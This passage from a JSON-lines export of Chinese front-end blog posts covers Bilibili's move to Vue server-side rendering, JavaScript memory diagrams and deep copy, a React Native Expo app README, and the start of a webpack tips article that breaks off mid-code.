我们再来看下tag\n页\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6400bb0013be?w=1855\u0026amp;h=480\u0026amp;f=png\u0026amp;s=140959\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e(不错 把数据都带上了)\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e重构\u003c/h2\u003e\n\u003cp\u003e其实也没过多久，大概三个月吧，node的版本涨的很快，在7.6版本之后，node 就支持了async/await\n语法糖，不需要再用yield 和*函数了，那么 无疑 koa 是对于await/async 支持最好的，我们果断放弃了express,选择了koa2 进行重构\u003c/p\u003e\n\u003cp\u003e其实不单单是koa2对于async的支持，另外一个原因在于，我们koa 是洋葱式的执行方式，这样就解决了上面我说的，只有controller的前处理，没有后处理，这样子我就可以很方便的去执行前后处理。Koa的执行效率也要好于express.\u003c/p\u003e\n\u003cp\u003e上面我说过，选择vue 对后面重构埋下了一个伏笔就在这里\u003c/p\u003e\n\u003cp\u003e首先，我给项目接入了配置中心，配置中心是干嘛用的呢？ 用来记录脚本的版本号，这样子我就可以很轻松的通过配置中心来控制前端页面使用什么版本的脚本。而不用因为改了个脚本的版本号，就需要进行一次服务的重启更新。\u003c/p\u003e\n\u003cp\u003e然后，我对vue的打包组件进行了魔改，将他打包出来的文件\n带上了对应的版本号（版本号为hash值）\u003c/p\u003e\n\u003cp\u003e这样子我就可以通过配置中心来控制，到底我需要使用什么版本的vue 构建产物，vue 前端逻辑更新了，我也只需要通过配置中心去分发给服务端，而不需要重启服务了。一举两得。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6402e1ea9b85?w=651\u0026amp;h=522\u0026amp;f=png\u0026amp;s=19155\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n图中 conf 就是配置中心，我们的server 会与conf进行一个长连接，如果conf中的配置更新了，就会通知到服务，然后服务去拉去新的bundle和manifest 来进行渲染。Ok 很棒\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e全民SSR\u003c/h2\u003e\n\u003cp\u003e重构完，那么再接入一个项目试试吧\u003c/p\u003e\n\u003cp\u003e首页，好，就首页吧\u003c/p\u003e\n\u003cp\u003e首页跟tag 页\n其实也都差不多，没有什么特别的地方，唯一不同的就是 量比较大，可能一天有1000W的访问量左右。那么我们就在CDN上面加上一层缓存，然后在我们服务上面也加上一层缓存。破费（perfect）！~\u003c/p\u003e\n\u003cp\u003e服务端的缓存是通过文件落地来的，就是在第一个请求进来的时候 在渲染完成之后，写一个文件到本地，然后下次访问的时候就可以直接用这个丢这个本地文件出去，不用再次渲染了，然后通过过期时间去控制。\u003c/p\u003e\n\u003cp\u003e这里发现了一个问题，就是每次更新 我都会将tag 和index 都进行打包，而我需要的是对项目进行单独的打包，单独的更新，能不能通过参数来控制我打包哪个呢，可以啊,首先先把webpack.config.js 重写，公用部分整合，然后私有的分开写成多个，通过package.json里面来多配置几个script就好啦\u003c/p\u003e\n\u003cp\u003e这样子每次更新项目的时候，我就只需要打包对应的项目就可以了，不会因为项目接入了很多之后，打包和开发时候的热加载变得很慢很慢。\u003c/p\u003e\n\u003cp\u003e由于接入了两层缓存，首页上线的时候，我们把服务从2个docker实例 扩容到了6个（docker扩容真方便），得益于缓存的优势，服务并没有什么压力\u003c/p\u003e\n\u003cp\u003e当然 首页不可能像说的那样，这么随便就上线了，需要有降级方案，那么降级方案得益于vue的强大了.\u003c/p\u003e\n\u003cp\u003eVue 会在浏览器端检验（data-server-render=true），是否服务端渲染了，如果服务端没有渲染，那么客户端会再执行一次逻辑进行渲染。这样子我们只要再打包的时候，将原本客户端渲染的那个index.html 保留就可以拉，当然别忘了，再客户端执行的时候也要运行一下asyncData里面的方法，不然会缺少数据哦。So easy~\u003c/p\u003e\n\u003cp\u003e接下来 一级分区 二级分区也分别都接入了，中间也遇到了一些问题，不过最后都顺利的解决了，后面有机会我再写一篇文章来说一下其中遇到的问题。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e再次重构\u003c/h2\u003e\n\u003cp\u003e我们的项目在有序的进行着从原本静态页 客户端渲染，往服务端渲染迁移的同时，我们也在公司内部进行这推广，有几个兄弟部门也遇到了我们之前的seo 的问题，或者是希望首屏更快等，所以很愿意使用我们已经造好的轮子。可是我们的项目暂时并不具有推广性，如果兄弟部门要使用，只有把我们的库拷贝过去，然后把业务逻辑删减掉，再加上自己的逻辑，成本很高，而且我们这边一旦更新了什么，他们都需要手动去同步，就很麻烦。\u003c/p\u003e\n\u003cp\u003e我们花了一点时间，首先，core\n核心库抽离出来，并且和日志中心的连接方法、配置中心的连接方法等一些公用方法一起，做成一个npm包\n发布到公司内部的npm 源上面，然后将client 从库里面独立出来，变成前端库，加上一个简单的server.js，可以独立于server 进行开发，而不用在开发的时候过分依赖node server.并且得益于配置中心，我们可以将项目分的很散，但是最终又通过配置中心，集中到同一个服务上，又回到了前后端分离上面，但是不止于前后端分离，前端独立开发的同事，还带上了服务端渲染，一举两得。设计架构如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6405d59b38e1?w=607\u0026amp;h=598\u0026amp;f=png\u0026amp;s=16005\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n顺带，我们开发了两个脚手架，可以很方便的创建项目，并且加好webpack的配置和package.json的配置\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这样子拆分之后，项目就变得很清真，前端开发前端vue项目，服务端有npm包可供大家使用，升级和维护都很方便，node服务也不需要一直去重启，通过配置即可更新逻辑，热更新。\u003c/p\u003e\n\u003cp\u003e做完之后，很多兄弟部门也都开始了接入。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e压力测试\u003c/h2\u003e\n\u003cp\u003e因为每个公司的情况都不一样，使用组件缓存，页面缓存等等方式，都可以达到优化的目的，使其可以达到能承载项目流量的标准，我这边说的情况是没有任何缓存的情况下的压测结果。\u003c/p\u003e\n\u003cp\u003e我们做过几次不同层面的压测，毕竟性能需要达到要求才行，记得当时出版打样上线的时候，VUE使用的版本是2.3.x 性能不是很好，因为VUE是基于虚拟DOM（VNODE）来实现的，是CPU密集型的项目，所以在压测的时候，CPU很快就达到了100%，TPS很低，所以我们对页面加了缓存，像首页这种P0级页面都加两层缓存，后来VUE更新到了2.4.x 性能变好了许多，但是CPU始终是一个瓶颈。如果项目复杂，组建嵌套很多的话，1C4G的服务器，CPU打满也就40到50的TPS就封顶了，再上去，用户等待时间就会呈指数式上升。\u003c/p\u003e\n\u003cp\u003e我看过很多文章，拿vuessr和字符串模板进行比较的文档，但是他们的比较demo都很简单，vue里面都没有组件嵌套，性能相比可能确实差不多，但是页面复杂度上升，组件嵌套越多，那么vuessr的性能就没法再跟字符串模板进行比较了\u003c/p\u003e\n\u003cp\u003e举个例子把，我们首页一二级分区每天打到node上面的量跟文章的量差不多，但是文章就用了首页三分之一的机器，机器的cpu和内存使用量差不多，因为文章项目用的是字符串模板。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e在整个的过程中，需要前端同学，后端同学的通力配合才行，后端api的同学需要将原本直接结合模板出数据的方法全部改成api接口，这是前后端分离的基础。至于基础建设，可以慢慢发展来完善，就像一开始我们构建的时候，构建出来的配置文件的版本号都是需要手动去配置到配置中心的，这很耗时，而且容易出错，慢慢的，配置中心开放出了api接口，我们接入就很方便了，顺利的实现了配置同步的自动化，只要上线的时候点一下发布就好了。\u003c/p\u003e\n\u003cp\u003e在用node做中间层的过程中，也有遇到内存泄漏，性能瓶颈等问题，后面有机会，再写篇文章介绍吧。在这一年中，B站发展的很快，前端也有意识的去在意前端性能，让页面更好，更快。\u003c/p\u003e\n\u003cp\u003e脚步从未停下，我们还在路上！\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e哔哩哔哩 (゜-゜)つロ 干杯~\u003c/h1\u003e\n","buildTime":"1514894892.6546","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e916"},"id":"5a49d06b5188257d6a7ee54f","author":{"$oid":"5a4b765a751bf823c002e909"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/1/160b1f8202fc7634?w=605\u0026h=278\u0026f=png\u0026s=50813","https://user-gold-cdn.xitu.io/2018/1/1/160b1f91d278c65b?w=898\u0026h=690\u0026f=png\u0026s=192925","https://user-gold-cdn.xitu.io/2018/1/1/160b1ff7d146a8bb?w=743\u0026h=385\u0026f=png\u0026s=107060","https://user-gold-cdn.xitu.io/2018/1/1/160b2056f294b9f4?w=832\u0026h=450\u0026f=png\u0026s=101553","https://user-gold-cdn.xitu.io/2018/1/1/160b2066bb7a2ba6?w=883\u0026h=483\u0026f=png\u0026s=117763"],"screenShot":null}],"title":"内存图（待补充）","meta":{"likeCount":0},"tag":["JavaScript","前端"],"comment":[],"shortContent":"内存是计算机中重要的部件之一，它是与CPU进行沟通的桥梁。计算机中所有程序的运行都是在内存中进行的，因此内存的性能对计算机的影响非常大。 计算机打开之后，会有一部分内存分给JS引擎（V8引擎），引擎将内存分为代码区和数据区，我们只研究数据区。数据区分为 Stack（栈内存）和H…","content":"\u003ch3 class=\"heading\"\u003e概念：\u003c/h3\u003e\n\u003cp\u003e内存是计算机中重要的部件之一，它是与CPU进行沟通的桥梁。计算机中所有程序的运行都是在内存中进行的，因此内存的性能对计算机的影响非常大。\u003c/p\u003e\n\u003cp\u003e计算机打开之后，会有一部分内存分给JS引擎（V8引擎），引擎将内存分为代码区和数据区，我们只研究数据区。数据区分为 Stack（栈内存）和Heap（堆内存），简单类型的数据直接存在Stack里，复杂类型的数据是把 Heap 地址存在 Stack 里。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e画内存图可以解决所有赋值及对象引用的面试题。\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e面试题1\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a\nb = \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\na是几？\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e答案：1\u003c/p\u003e\n\u003cp\u003e内存图如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1f8202fc7634?w=605\u0026amp;h=278\u0026amp;f=png\u0026amp;s=50813\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e面试题2\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a\nb = {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e}\n请问现在 a.name 是多少？\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e答案：'a'\u003c/p\u003e\n\u003cp\u003e内存图如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1f91d278c65b?w=898\u0026amp;h=690\u0026amp;f=png\u0026amp;s=192925\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e面试题3\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a\nb.name = \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e\n请问现在 a.name 是多少？\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e答案：'b'\u003c/p\u003e\n\u003cp\u003e内存图如下:\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1ff7d146a8bb?w=743\u0026amp;h=385\u0026amp;f=png\u0026amp;s=107060\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e面试题4\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a\nb = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n请问现在 a 是多少？\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e答案：{name: 'a'}\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注：null为空对象，即不引用对象\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e内存图如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b2056f294b9f4?w=832\u0026amp;h=450\u0026amp;f=png\u0026amp;s=101553\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b2066bb7a2ba6?w=883\u0026amp;h=483\u0026amp;f=png\u0026amp;s=117763\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e深拷贝\u003c/h3\u003e\n\u003cp\u003e对于简单类型的数据来说，赋值就是深拷贝。如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = 1\nvar b = a\nb = 2 //这个时候改变 b,a 完全不受 b 的影响\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于复杂类型的数据（对象）来说，要区分浅拷贝和深拷贝。\u003c/p\u003e\n\u003cp\u003e浅拷贝\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = {name: \u003cspan class=\"hljs-string\"\u003e'frank'\u003c/span\u003e}\nvar b = a\nb.name = \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e\na.name === \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e // \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e   因为我们对 b 操作后，a 也变了\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e深拷贝--对 Heap 内存进行完全的拷贝\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = {name: \u003cspan class=\"hljs-string\"\u003e'frank'\u003c/span\u003e}\nvar b = deepClone(a) // deepClone\nb.name = \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e\na.name === \u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e // \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e","buildTime":"1514894450.2024","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e917"},"id":"5a473458f265da4326532c45","author":{"$oid":"5a4b765a751bf823c002e911"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"React Native Expo开发的OW移动端项目","meta":{"likeCount":0},"tag":["React.js","开源","React Native","Ant Design"],"comment":[],"shortContent":"项目基于Expo的 React Native 构建技术。 exp publish用于发布 JS Bundle 文件，用于热更新应用，更改 app.json 文件的版本号，icon 之类，用户安装的 App 会自动同步发布时版本所改动的内。参考资料 1 参考资料 2","content":"\u003ch2 class=\"heading\"\u003eiOS演示\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"ezgif-2-466979bde1.gif\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6246e9944a1b?w=269\u0026amp;h=480\u0026amp;f=gif\u0026amp;s=1816263\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e开源地址\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/zxj963577494/OverWatchTeams-React-Native-Expo\"\u003eGitHub\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://gitee.com/zhengxujiang/OverWatchTeams-React-Redux-Native\"\u003eGitee\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目地址\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003eAndorid 版\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"android.png\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a624679cecf37?w=400\u0026amp;h=520\u0026amp;f=png\u0026amp;s=5128\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://fir.im/yg3w\"\u003eAndroid\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eExpo 版(需 Expo 移动端(\u003ca target=\"_blank\" href=\"https://play.google.com/store/apps/details?id=host.exp.exponent\"\u003eAndroid\u003c/a\u003e/\u003ca target=\"_blank\" href=\"https://itunes.com/apps/exponent\"\u003eiOS\u003c/a\u003e))\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"expo.png\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6245604c6eea?w=400\u0026amp;h=520\u0026amp;f=png\u0026amp;s=4815\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://exp.host/@linq/OverWatchTeams\"\u003eExpo\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e简介\u003c/h2\u003e\n\u003cp\u003e项目基于\u003ca target=\"_blank\" href=\"https://expo.io/\"\u003eExpo\u003c/a\u003e的 React Native 构建技术。\u003c/p\u003e\n\u003cp\u003eExpo 是一个围绕 React Native 构建的免费开源工具链，可帮助您使用 JavaScript 和 React 构建本地 iOS 和 Android 项目\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/index.html\"\u003eExpo 文档\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e技术栈\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eExpo\u003c/li\u003e\n\u003cli\u003eReact-Native\u003c/li\u003e\n\u003cli\u003eReact-Navigation\u003c/li\u003e\n\u003cli\u003eRedux\u003c/li\u003e\n\u003cli\u003eRedux-Saga\u003c/li\u003e\n\u003cli\u003eLeanCloud\u003c/li\u003e\n\u003cli\u003eAntd-Mobile\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e项目结构\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"screenshot_22.png\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a62456f8bd229?w=322\u0026amp;h=454\u0026amp;f=png\u0026amp;s=37275\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e准备工具\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e获取 Expo 构建桌面客户端(XDE)\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://xde-updates.exponentjs.com/download/mac\"\u003emacOS\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://xde-updates.exponentjs.com/download/win32\"\u003eWindows64-bit\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://xde-updates.exponentjs.com/download/linux-x86_64\"\u003eLinux\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e获取 Expo 预览 iOS 或 Android 客户端\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://play.google.com/store/apps/details?id=host.exp.exponent\"\u003eAndroid\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"google.png\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a62456bf312ee?w=400\u0026amp;h=520\u0026amp;f=png\u0026amp;s=7676\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://itunes.com/apps/exponent\"\u003eiOS\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"appstore.png\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a6244c778afd0?w=400\u0026amp;h=520\u0026amp;f=png\u0026amp;s=6332\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/introduction/installation.html\"\u003e参考资料\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e使用方式\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003egit clone https://github.com/zxj963577494/OverWatchTeams-React-Native-Expo.git\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e打开桌面客户端(XDE)加载本项目，启动本项目，点击 Share 获取二维码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e打开 iOS 或 Android 客户端，扫描 XDE 客户端二维码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/introduction/xde-tour.html\"\u003e参考资料\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e项目生成\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eyarn global add exp\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eexp build:ios / build:android\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eexp build:status\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/guides/exp-cli.html\"\u003e参考资料\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e项目发布\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eyarn global add exp\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eexp publish\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e一些说明\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eexp build:ios/build:android\u003c/code\u003e生成的是 JS Bundle 文件，Expo 会将该文件上传到 Expo 云端，由 Expo 构建 APP，使用\u003ccode\u003eexp build:status\u003c/code\u003e可以得到 APP 在云端构建的进度，构建完成后，会返回 APP 地址\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003eexp build:ios\u003c/code\u003e 时必须有$99 的开发者账户(我没有，所以没构建 iOS 版本)，如果 apple id 开启了两步验证，需要加\u003ccode\u003e--local-auth\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eexp publish\u003c/code\u003e用于发布 JS Bundle 文件，用于热更新应用，更改 app.json 文件的版本号，icon 之类，用户安装的 App 会自动同步发布时版本所改动的内。\u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/guides/publishing.html\"\u003e参考资料 1\u003c/a\u003e \u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/guides/offline-support.html\"\u003e参考资料 2\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eExpo 无法像原生 React Native 一样，可以对本地模块进行操作，当然\u003ccode\u003ereact-native link\u003c/code\u003e 命令也是无法使用的，但你可以使用 Expo 开放的操作本地功能的 API，\u003ca target=\"_blank\" href=\"https://docs.expo.io/versions/latest/sdk/index.html\"\u003eSDK API 参考\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e开源协议\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"./LICENSE\"\u003eGPL-2.0\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514893867.2613","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e91b"},"id":"5a4869aff265da43310e293f","author":{"$oid":"5a4b765a751bf823c002e90f"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"webpack实用小功能","meta":{"likeCount":0},"tag":["Webpack"],"comment":[],"shortContent":"配置很简单，那它的作用是什么呢？overlay的作用是可以在浏览器打开的页面显示终端编译时产生的错误。通过配置该属性，以后在写代码的时候，编译如果出错了，我们就不需要打开终端看到底是什么报错了，可以直接在页面里看到错误，对于开发而言确实很方便。 我们最容易遇到的问题代码全部打包…","content":"\u003cp\u003e上一次分享了vue2-webpack3，大多都是一些基础的内容，本期继续分享一些webpack比较实用的功能\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e1.overlay\u003c/h5\u003e\n\u003cp\u003eoverlay属于devServer的属性，配置案例如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003edevServer: {\n    \u003cspan class=\"hljs-attr\"\u003eoverlay\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003eerrors\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003ewarnings\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e配置很简单，那它的作用是什么呢？overlay的作用是可以在浏览器打开的页面显示终端编译时产生的错误。通过配置该属性，以后在写代码的时候，编译如果出错了，我们就不需要打开终端看到底是什么报错了，可以直接在页面里看到错误，对于开发而言确实很方便。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e2.require.ensure\u003c/h5\u003e\n\u003cp\u003e相比较overlay，require.ensure可以的作用更加实用，上次讲的vue2-webpack3我们配置的是多页面的应用，但是如果是SPA应用呢？\u003cbr\u003e\n我们最容易遇到的问题代码全部打包在一个js里面，导致这个js过于庞大，最终导致应用首次加载时等待时间过长，那么该怎么解决这个问题呢？require.ensure就是专门用来解决这个问题的。\u003c/p\u003e\n\u003ch6 class=\"heading\"\u003e该怎么使用？\u003c/h6\u003e\n\u003cp\u003e使用起来也很简单，只要按照下面的写法来进行vue的router配置即可：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Layout = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../Layout'\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Home = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003er\u003c/span\u003e =\u0026gt;\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e.ensure([], () =\u0026gt; r(\u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../home'\u003c/span\u003e), home)\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan 